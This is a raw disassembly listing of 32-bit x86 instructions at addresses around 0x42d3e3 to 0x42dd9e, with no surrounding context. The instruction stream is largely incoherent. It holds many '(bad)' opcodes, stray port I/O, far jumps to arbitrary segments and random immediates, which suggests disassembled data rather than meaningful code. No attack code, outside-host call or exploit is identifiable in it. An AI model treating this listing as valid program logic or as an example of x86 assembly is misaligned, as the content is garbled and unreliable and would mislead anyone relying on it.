  42d3e3:	jne    0x42d3cc
  42d3e5:	ret    0xe5ed
  42d3e8:	fist   DWORD PTR [ecx+edx*4+0x60926f35]
  42d3ef:	push   ebp
  42d3f0:	add    DWORD PTR [ebp-0x5a],esi
  42d3f3:	dec    ebx
  42d3f4:	sbb    ecx,DWORD PTR [ecx+0x501b54]
  42d3fa:	int    0xea
  42d3fc:	push   edx
  42d3fd:	pop    edi
  42d3fe:	mov    edi,0x4881ed4f
  42d403:	lds    ebp,FWORD PTR [eax-0x4e]
  42d406:	mov    eax,ds:0xcb55e7af
  42d40b:	inc    edx
  42d40c:	mov    esp,0xff85b1b6
  42d411:	setle  dl
  42d414:	stc    
  42d415:	in     eax,0x9c
  42d417:	push   edx
  42d418:	mov    edi,0xf98711e7
  42d41d:	dec    BYTE PTR [ecx-0x31]
  42d420:	test   DWORD PTR ds:0x97f35114,edx
  42d426:	add    BYTE PTR [edx],0xb9
  42d429:	dec    eax
  42d42a:	xchg   DWORD PTR [esi+eax*1+0x25],ecx
  42d42e:	pusha  
  42d42f:	inc    ebp
  42d430:	xchg   ebp,eax
  42d431:	mov    ds:0x2692ba6b,al
  42d436:	loopne 0x42d48a
  42d438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d439:	fdivr  st,st(0)
  42d43b:	jp     0x42d427
  42d43d:	or     esi,DWORD PTR [esp+eiz*4-0x7cf213c3]
  42d444:	jnp    0x42d402
  42d446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d447:	pop    eax
  42d448:	test   dh,cl
  42d44a:	or     eax,0x12a8c46b
  42d44f:	push   DWORD PTR gs:[ebx+0x7a987902]
  42d456:	and    al,0xf3
  42d459:	stos   BYTE PTR es:[edi],al
  42d45a:	cmp    bh,BYTE PTR [ecx]
  42d45c:	mov    dh,0xb0
  42d45e:	push   cs
  42d45f:	sbb    ebx,DWORD PTR [ebx-0xedebdf]
  42d465:	cdq    
  42d466:	mov    bl,0xb1
  42d468:	xchg   edi,eax
  42d469:	cmp    ecx,DWORD PTR [edx+0x47d2fb5d]
  42d46f:	inc    ebx
  42d470:	xchg   esi,eax
  42d471:	aaa    
  42d472:	je     0x42d4d0
  42d474:	daa    
  42d475:	mov    ebp,0x5074d15f
  42d47a:	xchg   ebp,eax
  42d47b:	leave  
  42d47c:	ja     0x42d4f1
  42d47e:	ss dec esp
  42d480:	enter  0xeddd,0x39
  42d484:	mov    ds:0xf14fba02,eax
  42d489:	or     ch,bh
  42d48b:	arpl   WORD PTR [ebx+0x2c8fe86a],bx
  42d491:	test   al,0x64
  42d493:	fst    QWORD PTR [edi-0x35da5d74]
  42d499:	fist   DWORD PTR [ebp-0x281ffc05]
  42d49f:	dec    ebp
  42d4a0:	outs   dx,DWORD PTR ds:[esi]
  42d4a1:	dec    esi
  42d4a2:	push   0x1774d97a
  42d4a7:	and    eax,0x9661b7f4
  42d4ac:	es jmp 0x42d4f6
  42d4af:	nop
  42d4b0:	es pop ecx
  42d4b2:	rcr    bl,1
  42d4b4:	mov    DWORD PTR [eax],0x0
	...
  42d516:	cdq    
  42d517:	cmc    
  42d518:	adc    BYTE PTR [ebx-0x12],0x77
  42d51c:	fcos   
  42d51e:	add    BYTE PTR [ebx],al
  42d520:	nop
  42d521:	repz mov ebx,0x56776b73
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    bh,bl
  42d52f:	js     0x42d4df
  42d531:	add    al,0x97
  42d533:	and    al,0x38
  42d535:	mov    al,ds:0xe7c06290
  42d53a:	in     eax,0x3d
  42d53c:	or     edx,DWORD PTR [ebp+0x4a88dd33]
  42d542:	stos   BYTE PTR es:[edi],al
  42d543:	jl     0x42d57a
  42d545:	cs or  al,0xf1
  42d548:	stc    
  42d549:	xlat   BYTE PTR ds:[ebx]
  42d54a:	cmp    dl,BYTE PTR [ebx+0x3db31ee4]
  42d550:	mov    al,ds:0xcc6b6e77
  42d555:	imul   edi,DWORD PTR [edx-0x1b56ae05],0xd5fb21a2
  42d55f:	sbb    eax,0x17f0c7ce
  42d564:	mov    DWORD PTR [edx],ebx
  42d566:	jl     0x42d53f
  42d568:	adc    dh,BYTE PTR [eax+0x371c9bdc]
  42d56e:	ins    DWORD PTR es:[edi],dx
  42d56f:	push   0x1
  42d571:	or     BYTE PTR [esi+0x2396426c],ah
  42d577:	mov    al,0x83
  42d579:	je     0x42d56c
  42d57b:	rol    BYTE PTR [esi+0x28],1
  42d57e:	xchg   DWORD PTR [edx-0x67e6a0aa],ebp
  42d584:	(bad)  
  42d585:	out    0x10,al
  42d587:	mov    bh,0x7c
  42d589:	sub    BYTE PTR [esi+0x58103a26],bl
  42d58f:	jg     0x42d5bc
  42d591:	(bad)  
  42d592:	sbb    eax,0x6b707d9e
  42d597:	pop    ds
  42d598:	ins    DWORD PTR es:[edi],dx
  42d599:	mov    ecx,0x32eac0b4
  42d59e:	(bad)  
  42d59f:	neg    BYTE PTR [edi-0x6a]
  42d5a2:	adc    al,0xab
  42d5a4:	out    dx,al
  42d5a5:	or     DWORD PTR [ebx-0x74],edi
  42d5a8:	push   ebp
  42d5a9:	jl     0x42d596
  42d5ab:	test   BYTE PTR [esi+0x4292a41e],al
  42d5b1:	fcomp  DWORD PTR [ecx]
  42d5b3:	pop    ebp
  42d5b4:	dec    esp
  42d5b5:	aaa    
  42d5b6:	pop    es
  42d5b7:	pop    ebp
  42d5b8:	sar    DWORD PTR [edx+0x78],cl
  42d5bb:	add    BYTE PTR [edx],0x7
  42d5be:	call   0xe4a8fcf4
  42d5c3:	dec    esp
  42d5c4:	mov    dl,0x1a
  42d5c6:	xchg   edi,eax
  42d5c7:	dec    edi
  42d5c8:	popf   
  42d5c9:	hlt    
  42d5ca:	mov    ebp,0xf3a41f3e
  42d5cf:	nop
  42d5d0:	xor    dh,dl
  42d5d2:	in     eax,dx
  42d5d3:	stc    
  42d5d4:	inc    edi
  42d5d5:	xor    eax,DWORD PTR [ebp-0x73]
  42d5d8:	dec    ebx
  42d5d9:	es cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42d5dc:	push   ebx
  42d5dd:	adc    BYTE PTR [ebp+0x5e7d0af0],ah
  42d5e3:	in     al,0xf5
  42d5e5:	pop    esi
  42d5e6:	sub    al,BYTE PTR [edi]
  42d5e8:	inc    ecx
  42d5e9:	jnp    0x42d654
  42d5eb:	adc    ch,BYTE PTR [eax-0x4d]
  42d5ee:	or     dh,BYTE PTR [ebp-0x7e82c655]
  42d5f4:	mov    ecx,0x8af7023d
  42d5f9:	xchg   ecx,eax
  42d5fa:	sar    DWORD PTR [edx-0x73],1
  42d5fd:	adc    BYTE PTR [eax+0x3a],ah
  42d600:	bsr    ebx,DWORD PTR [ecx+0x1db6f435]
  42d607:	dec    ebx
  42d608:	in     al,dx
  42d609:	xchg   esp,eax
  42d60b:	xacquire xchg DWORD PTR [edx-0x127551df],edx
  42d612:	popf   
  42d613:	in     al,dx
  42d614:	ds test al,0x9f
  42d617:	bound  ebx,QWORD PTR [esi]
  42d619:	rcl    esi,1
  42d61b:	subps  xmm3,XMMWORD PTR [ebx+0x53]
  42d61f:	ret    
  42d620:	fcomp  QWORD PTR [eax+edx*1-0x862b1c]
  42d627:	scas   al,BYTE PTR es:[edi]
  42d628:	xor    DWORD PTR [edx-0x20],edi
  42d62b:	cmp    ebx,eax
  42d62d:	cmp    DWORD PTR [eax],ebx
  42d62f:	outs   dx,DWORD PTR ds:[esi]
  42d630:	mov    cl,0xb6
  42d632:	ds ins BYTE PTR es:[edi],dx
  42d634:	call   0x0:0x0
	...
  42d693:	add    BYTE PTR [eax],al
  42d695:	add    bl,dh
  42d697:	add    esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0x9cfa8d59
  42d6a4:	lea    esi,[eax]
  42d6a6:	pop    ebp
  42d6a7:	out    0x1,al
  42d6a9:	add    BYTE PTR [edi],al
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    ah,dl
  42d6af:	retf   
  42d6b0:	mov    ss:0x4ffdab1b,eax
  42d6b6:	or     eax,edx
  42d6b8:	aad    0x80
  42d6ba:	lahf   
  42d6bb:	ja     0x42d652
  42d6bd:	ds retf 0x27b7
  42d6c1:	adc    ch,0xe4
  42d6c4:	pop    esi
  42d6c5:	push   0xddab3344
  42d6ca:	inc    ebp
  42d6cb:	inc    ebx
  42d6cc:	jns    0x42d65c
  42d6ce:	push   cs
  42d6cf:	mov    ah,0x53
  42d6d1:	mov    ch,0x62
  42d6d3:	imul   edi,DWORD PTR [edi],0xffffff8b
  42d6d6:	inc    eax
  42d6d7:	add    BYTE PTR [ebp-0x47],bh
  42d6da:	xchg   esp,esp
  42d6dc:	daa    
  42d6dd:	jle    0x42d681
  42d6df:	das    
  42d6e0:	mov    esi,0xe80abf94
  42d6e5:	ins    BYTE PTR es:[edi],dx
  42d6e6:	cmp    dh,dl
  42d6e8:	and    DWORD PTR [edx-0x46],eax
  42d6eb:	push   ss
  42d6ec:	push   es
  42d6ed:	add    al,0xe2
  42d6ef:	imul   edx,DWORD PTR [edx],0xffffffa8
  42d6f2:	mov    dl,0x26
  42d6f4:	and    cl,BYTE PTR ds:0x6d78cb4c
  42d6fa:	push   0xffffffc9
  42d6fc:	dec    edi
  42d6fd:	outs   dx,DWORD PTR ds:[esi]
  42d6fe:	sub    DWORD PTR [esi+edi*4-0x3b],esi
  42d702:	shr    DWORD PTR [ecx+esi*8-0x2555b259],0xe5
  42d70a:	pop    ebp
  42d70b:	cs add eax,0xdc64126d
  42d711:	xor    BYTE PTR [esi+0x16],bl
  42d714:	hlt    
  42d715:	inc    esi
  42d716:	addr16 test eax,0xf53b9056
  42d71c:	add    al,0x61
  42d71e:	or     cl,BYTE PTR [edx]
  42d720:	pop    edi
  42d721:	scas   eax,DWORD PTR es:[edi]
  42d722:	scas   eax,DWORD PTR es:[edi]
  42d723:	mov    ch,0xfc
  42d725:	out    dx,al
  42d726:	mov    al,ds:0x71f4b84f
  42d72b:	fsubr  DWORD PTR [esi]
  42d72d:	add    eax,0x329c5317
  42d732:	ror    edx,0x6
  42d735:	inc    ebx
  42d736:	clc    
  42d737:	xchg   DWORD PTR [esi],eax
  42d739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d73a:	mov    edi,0xf25e33e4
  42d73f:	and    eax,0x895e3d0c
  42d744:	pop    es
  42d745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d746:	inc    eax
  42d747:	adc    ch,BYTE PTR [ecx+0x22]
  42d74a:	sbb    al,0xf8
  42d74c:	sbb    al,dh
  42d74e:	add    cl,dh
  42d750:	(bad)  
  42d752:	leave  
  42d753:	and    BYTE PTR [edi+0x54],cl
  42d756:	std    
  42d757:	push   edx
  42d758:	xor    dl,BYTE PTR [edx]
  42d75a:	jmp    0xd77:0xd1a5c416
  42d761:	jne    0x42d6fb
  42d763:	gs popa 
  42d765:	sub    al,0xe7
  42d767:	inc    DWORD PTR ds:0x6b8f2363
  42d76d:	(bad)  
  42d76e:	fiadd  WORD PTR [ebx+ebp*8]
  42d771:	fiadd  DWORD PTR [ecx+0x5d]
  42d774:	jp     0x42d72e
  42d776:	add    eax,0xd030c5a7
  42d77b:	cmp    DWORD PTR [eax],eax
  42d77d:	fs out 0xeb,eax
  42d780:	in     al,0x43
  42d782:	push   ebp
  42d783:	pop    ebx
  42d784:	mov    edx,0x74ced4be
  42d789:	mov    esp,fs
  42d78b:	repnz mov esi,0x2db66fbb
  42d791:	test   DWORD PTR [ecx+edx*4-0x5d],ebp
  42d795:	lods   al,BYTE PTR ds:[esi]
  42d796:	xchg   DWORD PTR [edx+0x597bd32c],ecx
  42d79c:	mov    ebp,DWORD PTR [esp+ebp*1]
  42d79f:	mov    edx,0xf9ef301
  42d7a4:	aad    0xbd
  42d7a6:	popa   
  42d7a7:	or     eax,0xf1e29854
  42d7ac:	les    edx,FWORD PTR ss:[esi+0x28d66bbb]
  42d7b3:	cmp    BYTE PTR [ebx+0x0],0x0
	...
  42d816:	xchg   esi,eax
  42d817:	fwait
  42d818:	cwde   
  42d819:	pop    edi
  42d81a:	popf   
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0x61346495
  42d825:	(bad)  
  42d826:	fs out 0x1,eax
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR [esi+0x8],al
  42d830:	pop    ebp
  42d831:	fwait
  42d832:	mov    esp,ebx
  42d834:	shr    DWORD PTR [edx+0x3c],cl
  42d837:	imul   al
  42d839:	pop    es
  42d83a:	jle    0x42d870
  42d83c:	ins    DWORD PTR es:[edi],dx
  42d83d:	jmp    0x5ee8:0x10ce8a85
  42d844:	hlt    
  42d845:	xchg   ebp,eax
  42d846:	cdq    
  42d847:	(bad)  
  42d848:	push   ecx
  42d849:	ds stos BYTE PTR es:[edi],al
  42d84b:	sub    esp,ecx
  42d84d:	js     0x42d800
  42d84f:	fs jbe 0x42d7ea
  42d852:	call   0xa8a27151
  42d857:	push   ebx
  42d858:	mov    edx,0x637916eb
  42d85d:	mov    eax,0xf6248be7
  42d862:	fwait
  42d863:	or     BYTE PTR ds:0xc6e1900b,0x3f
  42d86a:	hlt    
  42d86b:	hlt    
  42d86c:	jg     0x42d851
  42d86e:	push   ebx
  42d86f:	mov    DWORD PTR [esi],ebx
  42d871:	fnstcw WORD PTR [eax]
  42d873:	and    al,0xbb
  42d875:	loopne 0x42d87f
  42d877:	xchg   BYTE PTR [ebp+0x52],ch
  42d87a:	dec    edx
  42d87b:	outs   dx,DWORD PTR ds:[esi]
  42d87c:	test   BYTE PTR [ebx],ah
  42d87e:	stc    
  42d87f:	adc    eax,0xb39f249
  42d884:	je     0x42d817
  42d886:	fild   QWORD PTR [eax]
  42d888:	cmc    
  42d889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d88a:	pop    eax
  42d88b:	pop    esi
  42d88c:	mov    dh,0x82
  42d88e:	in     eax,dx
  42d88f:	jmp    0x173e:0x5f09e345
  42d896:	fdivrp st(2),st
  42d898:	inc    edx
  42d899:	xchg   edx,eax
  42d89a:	pushf  
  42d89b:	(bad)  [ecx-0x18bb33a1]
  42d8a1:	and    DWORD PTR [ecx+0x3],ebp
  42d8a4:	out    dx,al
  42d8a5:	rcl    eax,1
  42d8a7:	sbb    dl,BYTE PTR [ebp+0x40]
  42d8aa:	bnd jmp 0x42d8d3
  42d8ad:	mov    ebx,0xf87178dd
  42d8b2:	jp     0x42d931
  42d8b4:	mov    dh,0xd
  42d8b6:	test   BYTE PTR [esi],bl
  42d8b8:	push   edx
  42d8b9:	scas   eax,DWORD PTR es:[edi]
  42d8ba:	jl     0x42d90b
  42d8bc:	call   0xbb416001
  42d8c1:	cld    
  42d8c2:	sar    BYTE PTR [edi+0x21e11321],cl
  42d8c8:	(bad)  
  42d8c9:	aad    0xe8
  42d8cb:	jmp    0x9e3f69b5
  42d8d0:	push   ss
  42d8d1:	inc    ebp
  42d8d2:	and    eax,0xac3923f8
  42d8d7:	push   ecx
  42d8d8:	sbb    dl,BYTE PTR [ebx+ecx*1]
  42d8db:	daa    
  42d8dc:	pop    esi
  42d8dd:	daa    
  42d8de:	mov    al,ds:0x9c1e935
  42d8e3:	xchg   esp,eax
  42d8e4:	test   ah,dh
  42d8e6:	dec    esi
  42d8e7:	bound  edi,QWORD PTR [esi]
  42d8e9:	adc    edi,DWORD PTR [ebp+0x4987ceef]
  42d8ef:	clc    
  42d8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8f1:	rcl    DWORD PTR [esp+eiz*4+0x42111b34],cl
  42d8f8:	fwait
  42d8f9:	sti    
  42d8fa:	out    0x5d,al
  42d8fc:	scas   al,BYTE PTR es:[edi]
  42d8fd:	cmp    eax,0xaa1c2a0e
  42d902:	test   eax,0x63597458
  42d907:	mov    al,ds:0x63c96d83
  42d90c:	jge    0x42d988
  42d90e:	mov    ebx,DWORD PTR [ebx]
  42d910:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d912:	push   esp
  42d913:	and    eax,0x3936ae81
  42d918:	pusha  
  42d919:	retf   
  42d91a:	test   BYTE PTR [esp+eax*2+0x60288f65],ah
  42d921:	lea    ebx,[ebx]
  42d923:	shl    BYTE PTR [ecx+ebx*1+0x3],0x71
  42d928:	in     eax,0x37
  42d92a:	in     eax,0xee
  42d92c:	fcmovb st,st(1)
  42d92e:	jae    0x42d8c4
  42d930:	push   0xb575d3c2
	...
  42d995:	add    cl,bh
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0x31a09514,ecx
  42d9a5:	cmp    DWORD PTR [ebx-0x18],ebp
  42d9a8:	add    DWORD PTR [eax],eax
  42d9aa:	pop    es
  42d9ab:	add    DWORD PTR [eax],eax
  42d9ad:	add    BYTE PTR [ebp+ecx*2-0x75],ch
  42d9b1:	xchg   edi,eax
  42d9b2:	loop   0x42da2d
  42d9b4:	popf   
  42d9b5:	mov    al,ds:0x9a819404
  42d9ba:	push   edi
  42d9bb:	(bad)  [edx]
  42d9bd:	int3   
  42d9be:	lahf   
  42d9bf:	retf   
  42d9c0:	stos   DWORD PTR es:[edi],eax
  42d9c1:	jle    0x42d9cd
  42d9c3:	add    eax,0xb5ef90af
  42d9c8:	fdivr  st,st(0)
  42d9ca:	mov    ah,BYTE PTR [ebp+0x3c]
  42d9cd:	repz out 0xb5,al
  42d9d0:	sti    
  42d9d1:	jl     0x42da0c
  42d9d3:	jns    0x42d97b
  42d9d5:	sar    DWORD PTR [ecx],cl
  42d9d7:	dec    edi
  42d9d8:	ins    BYTE PTR es:[edi],dx
  42d9d9:	pop    esp
  42d9da:	adc    DWORD PTR [esi-0x5ffca56f],0xe1b49f3c
  42d9e4:	push   ecx
  42d9e5:	enter  0x6915,0x62
  42d9e9:	js     0x42da61
  42d9eb:	push   edx
  42d9ec:	mov    ecx,0x40329691
  42d9f1:	sub    al,0x7
  42d9f3:	dec    edi
  42d9f4:	loope  0x42d9b5
  42d9f6:	rol    BYTE PTR [ecx+0x3f],0x66
  42d9fa:	cmp    dl,al
  42d9fc:	rcr    DWORD PTR [ecx],0x9d
  42d9ff:	sbb    edx,edi
  42da01:	inc    eax
  42da02:	jl     0x42da82
  42da04:	jo     0x42da7d
  42da06:	sub    esi,DWORD PTR [edi+0x2d]
  42da09:	adc    esi,DWORD PTR [eax]
  42da0b:	jae    0x42da10
  42da0d:	jmp    FWORD PTR [ebx-0x133fc23d]
  42da13:	jns    0x42d9a5
  42da15:	nop
  42da16:	lea    esp,[ebx-0x4ba5b720]
  42da1c:	lds    ebx,FWORD PTR [edx+eiz*8+0xa822606]
  42da23:	js     0x42d9e6
  42da25:	rcl    edi,1
  42da27:	ret    
  42da28:	outs   dx,BYTE PTR ds:[esi]
  42da29:	push   esp
  42da2a:	test   al,0x72
  42da2c:	mov    esi,eax
  42da2e:	or     DWORD PTR [esi],0x2580e2e1
  42da34:	stos   DWORD PTR es:[edi],eax
  42da35:	pop    esp
  42da36:	test   al,0x48
  42da38:	xor    eax,eax
  42da3a:	call   0x50e:0x6178bfd9
  42da41:	sub    al,0x3c
  42da43:	xor    al,dl
  42da45:	pop    eax
  42da46:	out    dx,eax
  42da47:	sub    DWORD PTR [ecx+ebx*1],esi
  42da4a:	lea    edi,[edi+eax*4+0x1c72c550]
  42da51:	pushf  
  42da52:	mov    al,0xef
  42da54:	sbb    edi,esi
  42da56:	fucomi st,st(0)
  42da58:	xor    al,BYTE PTR [ebx]
  42da5a:	fsubrp st(7),st
  42da5c:	cli    
  42da5d:	(bad)  
  42da5e:	fld    st(3)
  42da60:	jno    0x42d9fc
  42da62:	push   es
  42da63:	push   ebx
  42da64:	call   0xb5e8:0x3649cf00
  42da6b:	pop    edi
  42da6c:	inc    edi
  42da6d:	xlat   BYTE PTR ds:[ebx]
  42da6e:	lahf   
  42da6f:	jle    0x42d9f8
  42da71:	pop    ss
  42da72:	lods   al,BYTE PTR ds:[esi]
  42da73:	pop    eax
  42da74:	retf   0xa91e
  42da77:	sbb    esp,DWORD PTR [eax+0x4c]
  42da7a:	jns    0x42da97
  42da7c:	data16 (bad) 
  42da7f:	popa   
  42da80:	out    dx,eax
  42da81:	jecxz  0x42da4f
  42da83:	add    esp,0xffffffd1
  42da86:	outs   dx,DWORD PTR ds:[esi]
  42da87:	xchg   edx,eax
  42da89:	test   cl,dh
  42da8b:	dec    edx
  42da8c:	mov    al,0xab
  42da8e:	push   ss
  42da8f:	push   0xc729899e
  42da94:	adc    eax,0x6476c08
  42da99:	cli    
  42da9a:	fs dec ecx
  42da9c:	and    al,0x7d
  42da9e:	adc    al,0x35
  42daa0:	dec    edi
  42daa1:	clc    
  42daa2:	in     eax,0x2f
  42daa4:	fwait
  42daa5:	jbe    0xb32cf1b3
  42daab:	dec    eax
  42daac:	fist   WORD PTR [esi+0x2ecceadf]
  42dab2:	into   
  42dab3:	push   edi
  42dab4:	daa    
	...
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42db8f
  42db23:	adc    DWORD PTR [ecx],edx
  42db25:	(bad)  
  42db26:	jb     0x42db11
  42db28:	add    DWORD PTR [eax],eax
  42db2a:	pop    es
  42db2b:	add    DWORD PTR [eax],eax
  42db2d:	add    BYTE PTR [esi],ah
  42db2f:	mov    DWORD PTR cs:[edx*8+0x74cc93d3],edi
  42db37:	cmp    al,ah
  42db39:	jecxz  0x42db21
  42db3b:	sub    bh,bh
  42db3d:	inc    esi
  42db3e:	xchg   edi,eax
  42db3f:	loop   0x42db06
  42db41:	mov    eax,ds:0x3d58148a
  42db46:	pusha  
  42db47:	fldenv [eax+ebp*1]
  42db4a:	mov    cl,0xaf
  42db4c:	add    bl,BYTE PTR [edi-0x15]
  42db4f:	dec    ecx
  42db50:	xor    bh,BYTE PTR [eax+0x5cb7b77e]
  42db56:	inc    esp
  42db57:	jae    0x42dbae
  42db59:	and    eax,0xbb2cccee
  42db5e:	es cmp bh,cl
  42db61:	sub    eax,0x7c9d342b
  42db66:	or     bl,dh
  42db68:	mov    ds:0xd9f0dc93,al
  42db6d:	dec    esi
  42db6e:	fist   DWORD PTR [ebx-0x1e]
  42db71:	enter  0x164d,0x54
  42db75:	jne    0x42db42
  42db77:	mov    dl,0x50
  42db79:	or     al,0x8d
  42db7b:	dec    edi
  42db7c:	xchg   edi,eax
  42db7d:	fiadd  WORD PTR [ebx+edx*4+0x5c]
  42db81:	retf   
  42db82:	imul   DWORD PTR [eax-0x20]
  42db85:	jb     0x42dbd2
  42db87:	adc    BYTE PTR [edi+0x79],0xbb
  42db8b:	lock out 0xdd,eax
  42db8e:	sbb    eax,0x9d04717
  42db93:	addr16 iret 
  42db95:	and    DWORD PTR [eax],0xde7ce339
  42db9b:	loope  0x42dc16
  42db9d:	shr    esp,0x5a
  42dba0:	hlt    
  42dba1:	jns    0x42db67
  42dba3:	fdivr  DWORD PTR [esp+eax*8]
  42dba6:	sub    dl,BYTE PTR [ecx]
  42dba8:	cmp    BYTE PTR [eax+0x4d579546],0xf1
  42dbaf:	push   ebp
  42dbb0:	jnp    0x42dc05
  42dbb2:	hlt    
  42dbb3:	dec    esi
  42dbb4:	inc    ebp
  42dbb5:	or     al,0x52
  42dbb7:	xchg   al,dl
  42dbb9:	pushf  
  42dbba:	icebp  
  42dbbb:	cwde   
  42dbbc:	cmp    al,0xfa
  42dbbe:	mov    ?,WORD PTR [eax-0x7b5df57b]
  42dbc4:	dec    edx
  42dbc5:	aaa    
  42dbc6:	sbb    DWORD PTR [bp+di],ebp
  42dbc9:	mov    edx,0x7c58f684
  42dbce:	pop    eax
  42dbcf:	in     al,0xa1
  42dbd1:	dec    ecx
  42dbd2:	mov    esp,0xaec7f387
  42dbd7:	out    0x7a,al
  42dbd9:	mov    bl,0x6b
  42dbdb:	pop    ebp
  42dbdc:	in     al,dx
  42dbdd:	es mov al,0x5d
  42dbe0:	push   0x59
  42dbe2:	test   eax,0x75870781
  42dbe7:	inc    edi
  42dbe8:	pop    eax
  42dbe9:	pop    es
  42dbea:	dec    ebx
  42dbeb:	push   ebx
  42dbec:	cli    
  42dbed:	jb     0x42db88
  42dbef:	cmp    BYTE PTR [eax-0x1d],0x2b
  42dbf3:	inc    ebx
  42dbf4:	lods   eax,DWORD PTR ds:[esi]
  42dbf5:	dec    ebp
  42dbf6:	in     eax,0xa6
  42dbf8:	cmp    edx,DWORD PTR ds:0xfbb2569f
  42dbfe:	mov    edi,0xca9b46f2
  42dc03:	inc    eax
  42dc04:	adc    eax,0xe2afe6e7
  42dc09:	add    al,0x50
  42dc0b:	imul   esp,DWORD PTR [edi+0xa6057],0x5028bfc3
  42dc15:	div    BYTE PTR [ebp-0x30b53460]
  42dc1b:	mov    ebp,0xe1cdcc03
  42dc20:	inc    ebp
  42dc21:	int3   
  42dc22:	ret    
  42dc23:	pop    ss
  42dc24:	mov    edx,0x47bef1a
  42dc29:	dec    edx
  42dc2a:	add    bl,0x52
  42dc2d:	mov    ecx,0x92748cc1
  42dc32:	cli    
  42dc33:	sbb    edi,DWORD PTR [eax+eax*1+0x0]
	...
  42dc93:	add    BYTE PTR [eax],al
  42dc95:	add    BYTE PTR [ecx],bh
  42dc97:	mov    bh,0x6d
  42dc99:	pxor   mm3,mm7
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0xc404f285
  42dca4:	mov    DWORD PTR [edi+0x79],0x70001ea
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    BYTE PTR [eax],bl
  42dcaf:	xchg   ebx,eax
  42dcb0:	adc    BYTE PTR [edi],dh
  42dcb2:	fisubr WORD PTR [edx+edi*4+0x7c2f8e36]
  42dcb9:	aad    0xfe
  42dcbb:	sbb    esp,0x67
  42dcbe:	daa    
  42dcbf:	lods   eax,DWORD PTR ds:[esi]
  42dcc0:	adc    BYTE PTR [esi-0x10],ah
  42dcc3:	call   0xf2bb:0x81ad2129
  42dcca:	(bad)  
  42dccb:	dec    ebx
  42dccc:	aam    0x35
  42dcce:	gs test al,0x62
  42dcd1:	mov    esp,0xe3b7c5c
  42dcd6:	mov    ?,edi
  42dcd8:	xor    bh,bl
  42dcda:	mov    ds:0x4e5e3ba1,eax
  42dcdf:	sub    eax,0x7fe1879d
  42dce4:	jnp    0x42dd15
  42dce6:	ror    BYTE PTR gs:[ebx],cl
  42dce9:	dec    DWORD PTR [ebx-0x63]
  42dcec:	es pop edi
  42dcee:	gs inc ebp
  42dcf0:	sbb    BYTE PTR [esp+eiz*2+0x1fbecbb7],0x23
  42dcf8:	mov    es,WORD PTR [edx+0x20]
  42dcfb:	xchg   edx,eax
  42dcfc:	cmp    esp,0xffffffd7
  42dcff:	jno    0x42dd66
  42dd01:	in     al,0x3e
  42dd03:	push   0xbbec1233
  42dd08:	imul   ecx,DWORD PTR [ebx-0x43],0xffffff88
  42dd0c:	mov    edx,0xe06daa76
  42dd11:	rcr    BYTE PTR [esi-0x73896876],cl
  42dd17:	inc    ebp
  42dd18:	stc    
  42dd19:	push   eax
  42dd1a:	loopne 0x42dd0a
  42dd1c:	sbb    al,0x2a
  42dd1e:	aas    
  42dd1f:	push   edi
  42dd20:	mov    gs,WORD PTR ds:[eax]
  42dd23:	xor    esp,ebp
  42dd25:	mov    ds:0x6408b38a,eax
  42dd2a:	shl    BYTE PTR [ebp-0x5c],1
  42dd2d:	xchg   ebx,eax
  42dd2e:	jbe    0x42dcf0
  42dd30:	mov    eax,DWORD PTR [edi]
  42dd32:	fimul  DWORD PTR [ebx-0x4e55d788]
  42dd38:	adc    al,0x46
  42dd3a:	xchg   ebp,eax
  42dd3b:	(bad)  
  42dd3c:	sbb    al,BYTE PTR [esi+ecx*8+0x57536e8a]
  42dd43:	inc    ecx
  42dd44:	cwde   
  42dd45:	enter  0xf22d,0xef
  42dd49:	sub    eax,0xf33a7bc9
  42dd4e:	pop    ds
  42dd4f:	lods   al,BYTE PTR ds:[esi]
  42dd50:	xlat   BYTE PTR ds:[ebx]
  42dd51:	pop    es
  42dd52:	mov    eax,ds:0xe7d9d8
  42dd57:	imul   ebp,esp,0xa6bb1610
  42dd5d:	mov    eax,0x13fd648b
  42dd62:	daa    
  42dd63:	pop    edx
  42dd64:	daa    
  42dd65:	stc    
  42dd66:	fstp   QWORD PTR [edx-0x3e5a3401]
  42dd6c:	(bad)  
  42dd6d:	gs sti 
  42dd6f:	test   DWORD PTR [edx+esi*8-0x4a],ecx
  42dd73:	test   al,0xe1
  42dd75:	clc    
  42dd76:	loopne 0x42dd0e
  42dd78:	fidiv  DWORD PTR [esi+0x3fcc395e]
  42dd7e:	pushf  
  42dd7f:	mov    dh,0x90
  42dd81:	jge    0x42ddf8
  42dd83:	add    eax,0x884fa78
  42dd88:	(bad)  
  42dd89:	daa    
  42dd8a:	in     eax,0xb7
  42dd8c:	lock cli 
  42dd8e:	add    eax,0x7f5d9290
  42dd93:	mov    dl,0xf8
  42dd95:	les    esi,FWORD PTR [eax+esi*4]
  42dd98:	mov    es,WORD PTR [edx]
  42dd9a:	push   0xffffffec
  42dd9c:	test   al,0xd5
  42dd9e:	inc    esi
